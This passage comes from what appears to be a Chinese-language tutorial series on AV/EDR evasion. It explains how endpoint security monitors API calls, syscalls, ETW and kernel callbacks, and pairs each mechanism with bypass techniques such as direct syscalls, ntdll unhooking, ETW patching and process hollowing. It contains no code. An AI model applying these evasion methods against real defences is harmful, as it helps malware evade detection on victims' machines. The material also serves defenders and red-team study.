</ul>
<hr>
<p> <strong>总结</strong></p>
<p>了解检测的时机和范围对于设计有效的绕过技术至关重要。实时检测侧重于 <strong>在威胁完成之前阻止</strong>，而事后检测依赖于 <strong>分析留下的痕迹</strong>。掌握这种区别可以使红队员量身定制有效负载行为以保持隐蔽，并帮助蓝队员识别检测漏洞。</p>
<h2 id="AV-EDR-绕过实用技术-1-4-API-和系统调用监控"><a href="#AV-EDR-绕过实用技术-1-4-API-和系统调用监控" class="headerlink" title="AV&#x2F;EDR 绕过实用技术 - 1.4 - API 和系统调用监控"></a>AV&#x2F;EDR 绕过实用技术 - 1.4 - API 和系统调用监控</h2><p>理解端点安全解决方案如何监控 API 调用和系统调用对于有效的绕过至关重要。本节将探讨 <strong>AV 和 EDR 如何观察、拦截和分析应用程序与操作系统之间的交互</strong>，重点介绍 <strong>用户模式</strong> 和 <strong>内核模式</strong> 监控策略。</p>
<hr>
<h3 id="1-4-1-什么是-API-调用和系统调用？"><a href="#1-4-1-什么是-API-调用和系统调用？" class="headerlink" title="1.4.1 什么是 API 调用和系统调用？"></a><strong>1.4.1 什么是 API 调用和系统调用？</strong></h3><ul>
<li><p><strong>API 调用</strong>：由系统库（例如 <code>kernel32.dll</code>、<code>advapi32.dll</code>、<code>ws2_32.dll</code>）提供的高级功能，应用程序使用这些功能执行文件操作、进程创建或网络通信等操作。</p>
</li>
<li><p><strong>系统调用（Syscalls）</strong>：调用 Windows 内核的低级接口，由用户模式函数调用以请求内核服务（例如 <code>NtCreateFile</code>、<code>NtOpenProcess</code>）。</p>
</li>
</ul>
<blockquote>
<p><strong>示例</strong>：<code>kernel32.dll</code> 中的 <code>CreateProcessA()</code> 最终通过系统调用调用 <code>NtCreateUserProcess()</code>。</p>
</blockquote>
<hr>
<h3 id="1-4-2-为什么要监控-API-和系统调用？"><a href="#1-4-2-为什么要监控-API-和系统调用？" class="headerlink" title="1.4.2 为什么要监控 API 和系统调用？"></a><strong>1.4.2 为什么要监控 API 和系统调用？</strong></h3><p>安全工具监控这些调用是为了：</p>
<ul>
<li><p><strong>检测恶意行为</strong>，如进程注入、权限提升或未经授权的访问。</p>
</li>
<li><p><strong>追踪应用程序的执行流程</strong>，进行行为分析。</p>
</li>
<li><p><strong>执行策略</strong>（例如，阻止 PowerShell 从 Office 宏启动）。</p>
</li>
<li><p><strong>构建取证轨迹</strong>，通过记录参数、返回代码和调用进程的元数据。</p>
</li>
</ul>
<hr>
<h3 id="1-4-3-EDR-中的监控方法"><a href="#1-4-3-EDR-中的监控方法" class="headerlink" title="1.4.3 EDR 中的监控方法"></a><strong>1.4.3 EDR 中的监控方法</strong></h3><table>
<thead>
<tr>
<th>监控方法</th>
<th>描述</th>
<th>可见性级别</th>
<th>常见用途</th>
</tr>
</thead>
<tbody><tr>
<td><strong>API 钩子（用户模式）</strong></td>
<td>通过跳板补丁或 IAT 重定向调用到 API 函数。</td>
<td>用户模式</td>
<td>EDR 传感器、AV</td>
</tr>
<tr>
<td><strong>内联钩子</strong></td>
<td>重写函数的开头（前导）以跳转到自定义例程。</td>
<td>用户模式或内核</td>
<td>AV、注入器</td>
</tr>
<tr>
<td><strong>导入地址表（IAT）</strong></td>
<td>修改 PE 文件的 IAT 中的函数地址。</td>
<td>用户模式</td>
<td>AV、恶意软件</td>
</tr>
<tr>
<td><strong>ETW（Windows 事件追踪）</strong></td>
<td>使用内核工具回调来跟踪系统调用和事件。</td>
<td>内核 + 用户模式</td>
<td>EDR、Sysmon</td>
</tr>
<tr>
<td><strong>内核回调</strong></td>
<td>使用内核模式回调跟踪进程、线程、镜像加载、注册表操作等。</td>
<td>内核模式</td>
<td>EDR、驱动程序</td>
</tr>
<tr>
<td><strong>系统调用钩子</strong></td>
<td>在 SSDT（系统服务分发表）拦截系统调用。</td>
<td>内核模式</td>
<td>稀有（需要驱动）</td>
</tr>
<tr>
<td><strong>用户模式 API 日志记录</strong></td>
<td>记录对高级 API 的所有调用（例如，通过 Detours、MinHook）。</td>
<td>用户模式</td>
<td>EDR 遥测</td>
</tr>
</tbody></table>
<hr>
<h3 id="1-4-4-监控的实际示例"><a href="#1-4-4-监控的实际示例" class="headerlink" title="1.4.4 监控的实际示例"></a><strong>1.4.4 监控的实际示例</strong></h3><ul>
<li><p><strong>进程注入监控</strong>：</p>
<ul>
<li><p><code>VirtualAllocEx</code>、<code>WriteProcessMemory</code>、<code>CreateRemoteThread</code> 被标记。</p>
</li>
<li><p>EDR 记录完整的注入链和参数（目标 PID、缓冲区、大小）。</p>
</li>
</ul>
</li>
<li><p><strong>无文件执行监控</strong>：</p>
<ul>
<li><p>EDR 检测到 <code>PowerShell</code> 通过 <code>-enc</code> 标志调用编码的命令。</p>
</li>
<li><p>API 调用模式 + 命令行参数 &#x3D; 检测逻辑。</p>
</li>
</ul>
</li>
<li><p><strong>网络活动</strong>：</p>
<ul>
<li><p>监控 <code>WSAConnect</code>、<code>connect</code> 或 <code>HttpSendRequest</code> 调用。</p>
</li>
<li><p>EDR 可能拦截参数以查看目标 IP&#x2F;域名。</p>
</li>
</ul>
</li>
</ul>
<hr>
<h3 id="1-4-5-绕过影响"><a href="#1-4-5-绕过影响" class="headerlink" title="1.4.5 绕过影响"></a><strong>1.4.5 绕过影响</strong></h3><p>要绕过 API&#x2F;系统调用监控：</p>
<h4 id="用户模式绕过策略："><a href="#用户模式绕过策略：" class="headerlink" title="用户模式绕过策略："></a><strong>用户模式绕过策略</strong>：</h4><ul>
<li><p><strong>手动映射</strong>：手动加载 DLL，避免 <code>LoadLibrary()</code> 和 IAT 日志记录。</p>
</li>
<li><p><strong>直接系统调用</strong>：使用 <code>SysWhispers</code> 或 <code>Hell’s Gate</code> 等工具直接调用系统调用。</p>
</li>
<li><p><strong>间接系统调用</strong>：使用小工具或存根函数来混淆调用栈。</p>
</li>
</ul>
<h4 id="内核级绕过（高级）："><a href="#内核级绕过（高级）：" class="headerlink" title="内核级绕过（高级）："></a><strong>内核级绕过（高级）</strong>：</h4><ul>
<li><p><strong>系统调用覆盖</strong>：覆盖系统调用指令，将其重定向到备用系统调用。</p>
</li>
<li><p><strong>ETW 绕过</strong>：修补或禁用 ETW 消费者，如 <code>EtwEventWrite</code>。</p>
</li>
<li><p><strong>回调移除</strong>：注销内核回调（需要内核模式驱动）。</p>
</li>
</ul>
<hr>
<h3 id="1-4-6-检测与混淆博弈"><a href="#1-4-6-检测与混淆博弈" class="headerlink" title="1.4.6 检测与混淆博弈"></a><strong>1.4.6 检测与混淆博弈</strong></h3><p>安全工具和攻击者之间不断进行着猫鼠游戏：</p>
<table>
<thead>
<tr>
<th>安全技术</th>
<th>绕过对策</th>
</tr>
</thead>
<tbody><tr>
<td>API 钩子（kernel32.dll）</td>
<td>直接系统调用到 ntdll.dll</td>
</tr>
<tr>
<td>ETW 日志记录</td>
<td>ETW 修补或禁用</td>
</tr>
<tr>
<td>注册表更改监控</td>
<td>延迟或间接修改</td>
</tr>
<tr>
<td>镜像加载回调</td>
<td>手动 PE 加载&#x2F;注入</td>
</tr>
</tbody></table>
<hr>
<h3 id="1-4-7-实际场景"><a href="#1-4-7-实际场景" class="headerlink" title="1.4.7 实际场景"></a><strong>1.4.7 实际场景</strong></h3><p><strong>场景</strong>：恶意软件通过进程空洞技术执行：</p>
<ol>
<li><p>创建一个暂停的进程。</p>
</li>
<li><p>解除目标镜像的映射。</p>
</li>
<li><p>写入 shellcode。</p>
</li>
<li><p>恢复线程。</p>
</li>
</ol>
<p><strong>监控的 API 调用</strong>：</p>
<ul>
<li><code>CreateProcess</code>、<code>NtUnmapViewOfSection</code>、<code>WriteProcessMemory</code>、<code>ResumeThread</code>。</li>
</ul>
<p><strong>EDR 响应</strong>：</p>
<ul>
<li><p>标记异常的调用序列 + 内存权限。</p>
</li>
<li><p>实时警报或事后关联触发。</p>
</li>
</ul>
<p><strong>绕过策略</strong>：</p>
<ul>
<li>使用 <strong>系统调用级注入</strong>，避免已知的 API 调用，使用 <strong>延迟和混淆</strong>。</li>
</ul>
<hr>
<p> <strong>总结</strong></p>
<p>理解 API 和系统调用监控对于设计隐蔽的有效负载至关重要。大多数 EDR 依赖于 <strong>用户模式钩子和 ETW 追踪</strong> 来构建遥测，但攻击者可以通过 <strong>直接系统调用、手动映射和 ETW 篡改</strong> 等技术绕过这些监控。掌握这一领域对于有效的 EDR 绕过至关重要。</p>
<h2 id="AV-EDR-绕过实用技术-1-5-用户模式与内核模式钩子"><a href="#AV-EDR-绕过实用技术-1-5-用户模式与内核模式钩子" class="headerlink" title="AV&#x2F;EDR 绕过实用技术 - 1.5 - 用户模式与内核模式钩子"></a>AV&#x2F;EDR 绕过实用技术 - 1.5 - 用户模式与内核模式钩子</h2><p>钩子技术是 AV 和 EDR 用于监控和控制程序执行的基本技术之一。钩子指的是拦截或重定向函数调用或系统事件。根据实现的层级，钩子有两种主要形式：<strong>用户模式钩子（Userland Hooking）</strong>和<strong>内核模式钩子（Kernelland Hooking）</strong>。</p>
<p>理解这两者的区别，以及它们如何被安全解决方案利用，或者被攻击者滥用或绕过，对于掌握 AV&#x2F;EDR 绕过技术至关重要。</p>
<hr>
<h3 id="1-5-1-Windows-执行架构概述"><a href="#1-5-1-Windows-执行架构概述" class="headerlink" title="1.5.1 Windows 执行架构概述"></a><strong>1.5.1 Windows 执行架构概述</strong></h3><p>在深入探讨钩子技术之前，了解 Windows 的分层架构非常关键：</p>
<ul>
<li><p><strong>用户模式</strong>：标准应用程序运行的地方，访问系统资源的权限有限。</p>
</li>
<li><p><strong>内核模式</strong>：操作系统的核心（Windows 内核）和设备驱动程序，具有无限制的访问权限。</p>
</li>
</ul>
<p>钩子可以根据目标（观察、执行、阻止或重定向）发生在任意一个层级。</p>
<hr>
<h3 id="1-5-2-用户模式钩子"><a href="#1-5-2-用户模式钩子" class="headerlink" title="1.5.2 用户模式钩子"></a><strong>1.5.2 用户模式钩子</strong></h3><h4 id="定义："><a href="#定义：" class="headerlink" title="定义："></a><strong>定义：</strong></h4><p>用户模式钩子拦截应用程序对高层 API（如 <code>CreateProcess</code>、<code>VirtualAlloc</code>、<code>ReadFile</code> 等）的调用，这些 API 通常位于像 <code>kernel32.dll</code> 和 <code>user32.dll</code> 等 DLL 中。</p>
<h4 id="技术："><a href="#技术：" class="headerlink" title="技术："></a><strong>技术：</strong></h4><ul>
<li><p><strong>内联钩子（Inline Hooking）</strong>：覆盖函数的前导（前几个字节），将执行重定向到监控或恶意函数。</p>
</li>
<li><p><strong>导入地址表（IAT）钩子</strong>：修改模块的 IAT 中的函数指针，重定向到不同的实现。</p>
</li>
<li><p><strong>重定向库（Detour Libraries）</strong>：使用 Microsoft Detours 或类似库来包装或替换函数。</p>
</li>
</ul>
<h4 id="优势（从-AV-EDR-角度）："><a href="#优势（从-AV-EDR-角度）：" class="headerlink" title="优势（从 AV&#x2F;EDR 角度）："></a><strong>优势（从 AV&#x2F;EDR 角度）：</strong></h4><ul>
<li><p>部署更简单（不需要内核驱动）。</p>
</li>
<li><p>不需要管理员权限。</p>
</li>
<li><p>快速更新，特别是在云连接的 EDR 中。</p>
</li>
</ul>
<h4 id="限制："><a href="#限制：" class="headerlink" title="限制："></a><strong>限制：</strong></h4><ul>
<li><p>容易通过 <strong>直接系统调用</strong> 绕过。</p>
</li>
<li><p>易受到 <strong>卸载钩子</strong> 的攻击，即通过覆盖修补过的函数。</p>
</li>
<li><p>对被空洞化或暂停的子进程可能 <strong>不可见</strong>。</p>
</li>
</ul>
<hr>
<h3 id="1-5-3-内核模式钩子"><a href="#1-5-3-内核模式钩子" class="headerlink" title="1.5.3 内核模式钩子"></a><strong>1.5.3 内核模式钩子</strong></h3><h4 id="定义：-1"><a href="#定义：-1" class="headerlink" title="定义："></a><strong>定义：</strong></h4><p>内核模式钩子通过使用驱动程序在内核层面监控或修改行为，通常是通过内核模式回调或修改系统结构（如 SSDT，系统服务调度表）来实现。</p>
<h4 id="技术：-1"><a href="#技术：-1" class="headerlink" title="技术："></a><strong>技术：</strong></h4><ul>
<li><p><strong>SSDT 钩子</strong>：通过修改 SSDT 来拦截系统调用，指向自定义处理程序。</p>
</li>
<li><p><strong>回调注册</strong>：使用合法的内核 API 注册回调：</p>
<ul>
<li><p><code>PsSetCreateProcessNotifyRoutine</code></p>
</li>
<li><p><code>PsSetLoadImageNotifyRoutine</code></p>
</li>
<li><p><code>CmRegisterCallback</code></p>
</li>
</ul>
</li>
<li><p><strong>对象回调</strong>：通过 <code>ObRegisterCallbacks</code> 拦截对象操作。</p>
</li>
</ul>
<h4 id="优势："><a href="#优势：" class="headerlink" title="优势："></a><strong>优势：</strong></h4><ul>
<li><p>无法通过简单的用户模式技术绕过。</p>
</li>
<li><p>更深入地了解进程&#x2F;线程&#x2F;镜像&#x2F;注册表活动。</p>
</li>
<li><p>可以检测到 <strong>异常的内核行为</strong> 或 <strong>隐匿的 rootkit</strong>。</p>
</li>
</ul>
<h4 id="限制：-1"><a href="#限制：-1" class="headerlink" title="限制："></a><strong>限制：</strong></h4><ul>
<li><p>需要签名的内核驱动。</p>
</li>
<li><p>部署和维护更为复杂。</p>
</li>
<li><p>容易受到高级内核模式 rootkit 和驱动程序漏洞的攻击。</p>
</li>
</ul>
<hr>
<h3 id="1-5-4-比较表"><a href="#1-5-4-比较表" class="headerlink" title="1.5.4 比较表"></a><strong>1.5.4 比较表</strong></h3><table>
<thead>
<tr>
<th>特征</th>
<th>用户模式钩子</th>
<th>内核模式钩子</th>
</tr>
</thead>
<tbody><tr>
<td>操作层级</td>
<td>用户模式</td>
<td>内核模式</td>
</tr>
<tr>
<td>目标</td>
<td>DLL 中的 API 调用</td>
<td>系统调用、内核事件</td>
</tr>
<tr>
<td>示例</td>
<td><code>CreateProcess</code>、<code>VirtualAlloc</code>、<code>WriteFile</code></td>
<td><code>NtCreateProcess</code>、<code>NtMapViewOfSection</code></td>
</tr>
<tr>
<td>绕过方法</td>
<td>直接系统调用、卸载钩子</td>
<td>Rootkit、驱动漏洞、签名驱动</td>
</tr>
<tr>
<td>检测覆盖范围</td>
<td>限于用户模式活动</td>
<td>完整的操作系统级别可见性</td>
</tr>
<tr>
<td>部署复杂度</td>
<td>简单（不需要管理员权限）</td>
<td>需要驱动和签名</td>
</tr>
<tr>
<td>使用者</td>
<td>AV、EDR、注入器</td>
<td>EDR、Rootkit、内核模式恶意软件</td>
</tr>
</tbody></table>
<hr>
<h3 id="1-5-5-钩子与绕过的实际场景"><a href="#1-5-5-钩子与绕过的实际场景" class="headerlink" title="1.5.5 钩子与绕过的实际场景"></a><strong>1.5.5 钩子与绕过的实际场景</strong></h3><ul>
<li><p><strong>AV&#x2F;EDR 用例</strong>：EDR 代理会钩住关键函数，如 <code>NtOpenProcess</code>，以检测与受保护进程（如 <code>lsass.exe</code>）的交互尝试。</p>
</li>
<li><p><strong>攻击者对策</strong>：</p>
<ul>
<li><p>使用 <strong>直接系统调用存根</strong> 绕过用户模式钩子。</p>
</li>
<li><p>修补用户模式函数，将其恢复到原始字节（从干净的 <code>ntdll.dll</code> 恢复系统调用存根）。</p>
</li>
<li><p>避免使用标记的 API；使用 <strong>手动映射</strong>、<strong>无线程注入</strong> 或 <strong>早期注入</strong> 技术。</p>
</li>
</ul>
</li>
</ul>
<hr>
<h3 id="1-5-6-检测与反检测"><a href="#1-5-6-检测与反检测" class="headerlink" title="1.5.6 检测与反检测"></a><strong>1.5.6 检测与反检测</strong></h3><ul>
<li><p><strong>钩子指示符</strong>：</p>
<ul>
<li><p>修改了函数的前导（例如，JMP 指令）。</p>
</li>
<li><p>内存中的可疑 DLL（例如，未知的 EDR 钩子）。</p>
</li>
<li><p><code>ntdll.dll</code> 在内存和磁盘中的加载差异。</p>
</li>
</ul>
</li>
<li><p><strong>检测工具</strong>：</p>
<ul>
<li><code>PE-sieve</code>、<code>HookFinder</code>、<code>HollowsHunter</code>、<code>Detect-It-Easy</code>。</li>
</ul>
</li>
<li><p><strong>卸载钩子策略</strong>：</p>
<ul>
<li><p><strong>手动修补</strong>：将干净的系统调用指令复制到内存中。</p>
</li>
<li><p>**重新映射 <code>ntdll.dll</code>**：手动加载新的副本。</p>
</li>
<li><p><strong>使用 SysWhispers&#x2F;Hell’s Gate</strong>：完全避免用户模式。</p>
</li>
</ul>
</li>
</ul>
<hr>
<p><strong>总结</strong></p>
<p>钩子是一种强大但脆弱的安全执行技术。<strong>用户模式钩子速度更快且易于部署，但更容易被绕过</strong>，而<strong>内核模式钩子提供更深的洞察力，但部署更困难且易于被攻击</strong>。绕过技术的实践者必须学会如何检测并规避这两种钩子技术，以有效绕过 AV&#x2F;EDR 防护。</p>
<h2 id="AV-EDR-绕过实用技术-1-6-执行流程监控（ETW、系统调用、回调）"><a href="#AV-EDR-绕过实用技术-1-6-执行流程监控（ETW、系统调用、回调）" class="headerlink" title="AV&#x2F;EDR 绕过实用技术 - 1.6 - 执行流程监控（ETW、系统调用、回调）"></a>AV&#x2F;EDR 绕过实用技术 - 1.6 - 执行流程监控（ETW、系统调用、回调）</h2><p>现代 EDR 系统严重依赖于深度系统监控技术，这些技术使得它们能够追踪从 API 调用到系统调用、内存使用、线程活动以及模块加载的 <strong>完整执行流程</strong>。这种可见性支持 <strong>实时检测</strong> 和 <strong>取证分析</strong>。理解这些机制对于防御者和攻击者都至关重要。</p>
<hr>
<h3 id="1-6-1-什么是执行流程监控？"><a href="#1-6-1-什么是执行流程监控？" class="headerlink" title="1.6.1 什么是执行流程监控？"></a><strong>1.6.1 什么是执行流程监控？</strong></h3><p>执行流程监控指的是在程序执行过程中跟踪函数调用和事件的顺序及行为。这包括：</p>
<ul>
<li><p>高级 API 使用（<code>CreateProcess</code>、<code>WriteFile</code> 等）</p>
</li>
<li><p>低级系统调用（<code>NtCreateProcess</code>、<code>NtWriteVirtualMemory</code> 等）</p>
</li>
<li><p>内存和线程操作</p>
</li>
<li><p>模块加载、镜像映射</p>
</li>
<li><p>注册表和文件访问</p>
</li>
<li><p>对象句柄和回调</p>
</li>
</ul>
<p>这些数据通过不同方式捕获，包括：</p>
<ul>
<li><p><strong>ETW（Windows 事件追踪）</strong></p>
</li>
<li><p><strong>系统调用</strong>（直接和间接追踪）</p>
</li>
<li><p><strong>内核回调和通知</strong></p>
</li>
</ul>
<hr>
<h3 id="1-6-2-Windows-事件追踪（ETW）"><a href="#1-6-2-Windows-事件追踪（ETW）" class="headerlink" title="1.6.2 Windows 事件追踪（ETW）"></a><strong>1.6.2 Windows 事件追踪（ETW）</strong></h3><h4 id="概述："><a href="#概述：" class="headerlink" title="概述："></a><strong>概述：</strong></h4><p>ETW 是一个高性能的追踪系统，内置于 Windows 中，允许实时收集系统和应用程序事件。</p>
<h4 id="EDR-中的使用："><a href="#EDR-中的使用：" class="headerlink" title="EDR 中的使用："></a><strong>EDR 中的使用：</strong></h4><p>EDR 和其他基于遥测的工具订阅各种 <strong>ETW 提供者</strong>，以便获得详细的遥测数据，而不干扰进程执行。</p>
<h4 id="关键提供者："><a href="#关键提供者：" class="headerlink" title="关键提供者："></a><strong>关键提供者：</strong></h4><ul>
<li><p><strong>Sysmon</strong>（基于事件 ID 的追踪）</p>
</li>
<li><p><strong>Microsoft-Windows-Threat-Intelligence</strong></p>
</li>
<li><p><strong>Microsoft-Windows-Kernel-Process</strong></p>
</li>
<li><p><strong>Microsoft-Windows-Kernel-Image</strong></p>
</li>
</ul>
<h4 id="常见追踪事件："><a href="#常见追踪事件：" class="headerlink" title="常见追踪事件："></a><strong>常见追踪事件：</strong></h4><ul>
<li><p>进程创建和终止</p>
</li>
<li><p>线程启动&#x2F;停止</p>
</li>
<li><p>DLL 加载&#x2F;卸载</p>
</li>
<li><p>注册表修改</p>
</li>
<li><p>网络连接</p>
</li>
</ul>
<h4 id="优势：-1"><a href="#优势：-1" class="headerlink" title="优势："></a><strong>优势：</strong></h4><ul>
<li><p>非侵入性（无需钩子或内联修补）</p>
</li>
<li><p>更难被用户模式检测或阻止</p>
</li>
<li><p>高度可扩展且可定制</p>
</li>
</ul>
<h4 id="绕过技术："><a href="#绕过技术：" class="headerlink" title="绕过技术："></a><strong>绕过技术：</strong></h4><ul>
<li><p>阻止 ETW 函数 (<code>EtwEventWrite</code>、<code>EtwNotificationRegister</code>)</p>
</li>
<li><p>在用户模式中覆盖 ETW 注册</p>
</li>
<li><p>使用未监控的系统调用</p>
</li>
<li><p>通过原生 API 或篡改删除 ETW 提供者</p>
</li>
</ul>
<hr>
<h3 id="1-6-3-系统调用监控"><a href="#1-6-3-系统调用监控" class="headerlink" title="1.6.3 系统调用监控"></a><strong>1.6.3 系统调用监控</strong></h3><h4 id="定义：-2"><a href="#定义：-2" class="headerlink" title="定义："></a><strong>定义：</strong></h4><p>系统调用监控指的是观察从用户模式到内核模式的直接过渡，使用如 <code>syscall</code>、<code>int 0x2e</code> 或 <code>sysenter</code> 等指令。</p>
<h4 id="监控的系统调用："><a href="#监控的系统调用：" class="headerlink" title="监控的系统调用："></a><strong>监控的系统调用：</strong></h4><ul>
<li><p><code>NtOpenProcess</code>、<code>NtReadVirtualMemory</code></p>
</li>
<li><p><code>NtCreateThreadEx</code>、<code>NtWriteVirtualMemory</code></p>
</li>
<li><p><code>NtMapViewOfSection</code>、<code>NtUnmapViewOfSection</code></p>
</li>
</ul>
<h4 id="监控方法："><a href="#监控方法：" class="headerlink" title="监控方法："></a><strong>监控方法：</strong></h4><ul>
<li><p>钩住系统调用调度表（SSDT）</p>
</li>
<li><p>通过内核驱动记录系统调用参数</p>
</li>
<li><p>将原始系统调用号映射到有意义的函数</p>
</li>
<li><p>使用虚拟机监控器（Hypervisor）获得完全可见性</p>
</li>
</ul>
<h4 id="绕过策略："><a href="#绕过策略：" class="headerlink" title="绕过策略："></a><strong>绕过策略：</strong></h4><ul>
<li><p>自定义系统调用存根（SysWhispers、Hell’s Gate）</p>
</li>
<li><p>系统调用使用的混淆</p>
</li>
<li><p>间接系统调用链（通过内存小工具）</p>
</li>
</ul>
<hr>
<h3 id="1-6-4-内核回调"><a href="#1-6-4-内核回调" class="headerlink" title="1.6.4 内核回调"></a><strong>1.6.4 内核回调</strong></h3><h4 id="定义：-3"><a href="#定义：-3" class="headerlink" title="定义："></a><strong>定义：</strong></h4><p>内核模式回调通过内核 API 注册，用于观察系统级事件。</p>
<h4 id="EDR-使用的常见回调："><a href="#EDR-使用的常见回调：" class="headerlink" title="EDR 使用的常见回调："></a><strong>EDR 使用的常见回调：</strong></h4><ul>
<li><p><code>PsSetCreateProcessNotifyRoutine</code>：进程创建</p>
</li>
<li><p><code>PsSetLoadImageNotifyRoutine</code>：镜像加载追踪</p>
</li>
<li><p><code>ObRegisterCallbacks</code>：句柄&#x2F;对象访问（例如，打开 <code>lsass</code>）</p>
</li>
<li><p><code>CmRegisterCallbackEx</code>：注册表访问</p>
</li>
</ul>
<h4 id="EDR-如何使用回调："><a href="#EDR-如何使用回调：" class="headerlink" title="EDR 如何使用回调："></a><strong>EDR 如何使用回调：</strong></h4><p>这些回调允许在系统完成请求操作之前进行实时检测和访问控制。</p>
<h4 id="绕过和规避技术："><a href="#绕过和规避技术：" class="headerlink" title="绕过和规避技术："></a><strong>绕过和规避技术：</strong></h4><ul>
<li><p>进程幽灵化&#x2F;空洞化以避免检测</p>
</li>
<li><p>句柄复制绕过 <code>ObRegisterCallbacks</code></p>
</li>
<li><p>篡改内核对象</p>
</li>
<li><p>驱动程序级别的回调表操作（需要内核访问）</p>
</li>
</ul>
<hr>
<h3 id="1-6-5-实际案例"><a href="#1-6-5-实际案例" class="headerlink" title="1.6.5 实际案例"></a><strong>1.6.5 实际案例</strong></h3><p>攻击者使用 <code>NtWriteVirtualMemory</code> 向远程进程注入 shellcode。</p>
<ul>
<li><p><strong>ETW</strong> 记录了注入活动。</p>
</li>
<li><p><strong>系统调用</strong> 被 EDR 的内核传感器标记。</p>
</li>
<li><p><strong>ObRegisterCallbacks</strong> 检测到尝试打开受保护句柄的行为。</p>
</li>
<li><p>EDR 代理基于这些事件的关联报告可疑行为。</p>
</li>
</ul>
<p>为绕过：</p>
<ul>
<li><p>攻击者使用 <strong>直接系统调用存根</strong> 并加入随机熵。</p>
</li>
<li><p>避免已知的 ETW 监控模式。</p>
</li>
<li><p>假冒父进程 ID（PPID），创建暂停的进程以避开回调。</p>
</li>
</ul>
<hr>
<h3 id="1-6-6-绕过总结表"><a href="#1-6-6-绕过总结表" class="headerlink" title="1.6.6 绕过总结表"></a><strong>1.6.6 绕过总结表</strong></h3><table>
<thead>
<tr>
<th>监控机制</th>
<th>AV&#x2F;EDR 使用</th>
<th>常见追踪内容</th>
<th>绕过技术</th>
</tr>
</thead>
<tbody><tr>
<td>ETW</td>
<td>所有主要 EDR</td>
<td>进程、注册表、镜像</td>
<td>修补 <code>EtwEventWrite</code> 或注销</td>
</tr>
<tr>
<td>系统调用追踪</td>
<td>高级 EDR、沙箱</td>
<td>低级 API 行为</td>
<td>直接系统调用、系统调用欺骗</td>
</tr>
<tr>
<td>内核回调</td>
<td>内核模式传感器</td>
<td>进程&#x2F;镜像&#x2F;注册表</td>
<td>幽灵化、混淆、篡改</td>
</tr>
</tbody></table>
<hr>
<h3 id="1-6-7-研究与检测工具"><a href="#1-6-7-研究与检测工具" class="headerlink" title="1.6.7 研究与检测工具"></a><strong>1.6.7 研究与检测工具</strong></h3><ul>
<li><p><strong>ETW 监控</strong>：<code>Logman</code>、<code>xperf</code>、<code>ETWExplorer</code>、<code>SilkETW</code></p>
</li>
<li><p><strong>系统调用分析</strong>：<code>Sysmon</code>、<code>Procmon</code>、<code>strace</code>、<code>Syscall2name</code></p>
</li>
<li><p><strong>回调检测</strong>：<code>Windbg</code>、<code>PE-sieve</code>、<code>EDRSandblast</code>、<code>KProcessHacker</code></p>
</li>
</ul>
<hr>
<p> <strong>总结</strong></p>
<p>执行流程监控构成了现代 EDR 解决方案的 <strong>核心监控机制</strong>。ETW 提供可见性，系统调用追踪增加深度，而内核回调则提供控制。绕过或破坏这条监控链是隐匿型恶意软件和红队操作的核心技术。</p>
<h2 id="AV-EDR-绕过实用技术-1-7-代理与云之间的数据通信（代理-↔-云）"><a href="#AV-EDR-绕过实用技术-1-7-代理与云之间的数据通信（代理-↔-云）" class="headerlink" title="AV&#x2F;EDR 绕过实用技术 - 1.7 - 代理与云之间的数据通信（代理 ↔ 云）"></a>AV&#x2F;EDR 绕过实用技术 - 1.7 - 代理与云之间的数据通信（代理 ↔ 云）</h2><p>现代 EDR 平台采用分布式架构，安装在终端的轻量级代理与通常托管在云端的中央后端进行通信。理解这种通信机制对于攻击者（可能想要阻止、延迟或伪造数据）和防御者（依赖这些遥测数据进行威胁检测和事件响应）都至关重要。</p>
<hr>
<h3 id="1-7-1-代理-云架构"><a href="#1-7-1-代理-云架构" class="headerlink" title="1.7.1 代理-云架构"></a><strong>1.7.1 代理-云架构</strong></h3><h4 id="代理的职责："><a href="#代理的职责：" class="headerlink" title="代理的职责："></a><strong>代理的职责：</strong></h4><ul>
<li><p>收集遥测数据（进程、文件、注册表、网络、内存）</p>
</li>
<li><p>应用本地检测逻辑（签名、启发式、指标）</p>
</li>
<li><p>通过 ETW、回调和钩子监视系统行为</p>
</li>
<li><p>执行策略决策（阻止执行、隔离文件）</p>
</li>
<li><p>将数据发送到云端以便进行关联和机器学习分析</p>
</li>
</ul>
<h4 id="云端的职责："><a href="#云端的职责：" class="headerlink" title="云端的职责："></a><strong>云端的职责：</strong></h4><ul>
<li><p>汇总来自成千上万&#x2F;百万个代理的数据</p>
</li>
<li><p>跨端点关联事件</p>
</li>
<li><p>运行行为模型、图分析和机器学习分类</p>
</li>
<li><p>触发警报和行动（例如，隔离主机、创建工单）</p>
</li>
<li><p>存储日志以便于取证和合规性</p>
</li>
</ul>
<hr>
<h3 id="1-7-2-通信协议和数据类型"><a href="#1-7-2-通信协议和数据类型" class="headerlink" title="1.7.2 通信协议和数据类型"></a><strong>1.7.2 通信协议和数据类型</strong></h3><h4 id="使用的协议："><a href="#使用的协议：" class="headerlink" title="使用的协议："></a><strong>使用的协议：</strong></h4><ul>
<li><p>HTTPS（TLS 加密） – 用于安全遥测传输的标准</p>
</li>
<li><p>MQTT、WebSocket – 用于轻量级实时通信</p>
</li>
<li><p>专有的二进制协议（压缩和序列化）</p>
</li>
</ul>
<h4 id="传输的数据类型："><a href="#传输的数据类型：" class="headerlink" title="传输的数据类型："></a><strong>传输的数据类型：</strong></h4><ul>
<li><p>进程创建日志</p>
</li>
<li><p>DLL 加载和镜像哈希</p>
</li>
<li><p>注册表修改条目</p>
</li>
<li><p>文件操作（创建、读取、写入、删除）</p>
</li>
<li><p>网络连接和 DNS 请求</p>
</li>
<li><p>内存区域分配和注入</p>
</li>
<li><p>警报或策略违规报告</p>
</li>
</ul>
<hr>
<h3 id="1-7-3-数据传输行为"><a href="#1-7-3-数据传输行为" class="headerlink" title="1.7.3 数据传输行为"></a><strong>1.7.3 数据传输行为</strong></h3><table>
<thead>
<tr>
<th><strong>属性</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>实时流式传输</strong></td>
<td>高优先级事件立即发送（例如，恶意软件检测）</td>
</tr>
<tr>
<td><strong>批量上传</strong></td>
<td>低优先级数据缓存并定期发送</td>
</tr>
<tr>
<td><strong>离线缓存</strong></td>
<td>如果离线，数据会本地存储，重新连接后发送</td>
</tr>
<tr>
<td><strong>心跳消息</strong></td>
<td>定期检查代理的健康状况&#x2F;状态</td>
</tr>
</tbody></table>
